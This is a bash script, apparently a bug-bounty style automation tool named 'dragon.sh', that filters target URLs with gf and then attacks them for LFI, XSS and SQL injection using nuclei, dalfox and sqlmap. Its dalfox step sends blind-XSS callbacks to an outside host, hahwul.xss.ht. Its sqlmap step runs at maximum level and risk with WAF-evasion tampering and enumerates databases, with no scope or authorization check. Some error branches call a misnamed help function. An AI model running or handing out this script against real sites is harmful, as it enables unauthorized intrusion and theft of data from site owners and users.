#!/bin/bash

# This script automates web application security tests using various tools like gf, nuclei, dalfox, and sqlmap. 
# It allows users to specify a list of target URLs and conduct tests for LFI, XSS, and SQLi vulnerabilities.

# Make directory for results
mkdir -p Results

targetList=""
gfCall=false
lfiCall=false
xssCall=false
sqliCall=false
allCall=false

# Function to display script usage and options
showHelp() {
  echo "Usage: ./dragon.sh [-t target_file] [-l] [-x] [-s] [-h]"
  echo "Options:"
  echo "  -t <target_file>    Specify the file containing target URLs"
  echo "  -g                  Generate lists using 'gf' for LFI, XSS, and SQLi"
  echo "  -l                  Perform LFI (Local File Inclusion) tests"
  echo "  -x                  Perform XSS (Cross-Site Scripting) tests"
  echo "  -s                  Perform SQLi (SQL Injection) tests"
  echo "  -h                  Display this help message"
  echo ""
  echo "Example:"
  echo "  ./dragon.sh -t targets.txt -l -x"
  echo "    - Perform LFI and XSS tests on URLs listed in 'targets.txt'"
  echo ""
}


# Parse command-line options
while getopts ":t:lgxsah" opt; do
  case ${opt} in
    t )
      targetList="$OPTARG"
      ;;
    g )
      gfCall=true
      ;;
    l )
      lfiCall=true
      ;;
    x )
      xssCall=true
      ;;
    s )
      sqliCall=true
      ;;
    a )
      allCall=true
      ;;
    h )
      showHelp
      exit 0
      ;;
    \? )
      echo "Invalid option: -$OPTARG" 1>&2
      show_help
      exit 1
      ;;
    : )
      echo "Invalid option: -$OPTARG requires an argument" 1>&2
      show_help
      exit 1
      ;;
  esac
done
shift $((OPTIND -1))

# Variable to make lists with gf
gfListMaker() {
  # Make directory for results
  mkdir -p gfLists
  cat $targetList | gf lfi | tee gfLists/lfiGF
  cat $targetList | gf xss | tee gfLists/xssGF
  cat $targetList | gf sqli | tee gfLists/sqliGF
}



lfiAttack() {
  cat gfLists/lfiGF | nuclei -tags lfi | tee -a Results/lfi
}


xssAttack() {
  dalfox -b hahwul.xss.ht file gfLists/xssGF | tee -a Results/xss

  cat gfLists/xssGF | nuclei -tags xss | tee -a Results/xss
}


sqliAttack() {
  sqlmap -m gfLists/sqliGF --level 5 --risk 3 --batch --dbs --tamper=between | tee -a Results/sqli

  cat gfLists/sqliGF | nuclei -tags sqli | tee -a Results/sqli 
}


# Main function to call other functions
main () {
  if [ "$gfCall" = true ]; then
    gfListMaker
  fi

  if [ "$lfiCall" = true ]; then
    lfiAttack
  fi

  if [ "$xssCall" = true ]; then
    xssAttack
  fi

  if [ "$sqliCall" = true ]; then
    sqliAttack
  fi
  if [ "$allCall" = true ]; then
    lfiAttack
    xssAttack
    sqliAttack
  fi
}
main
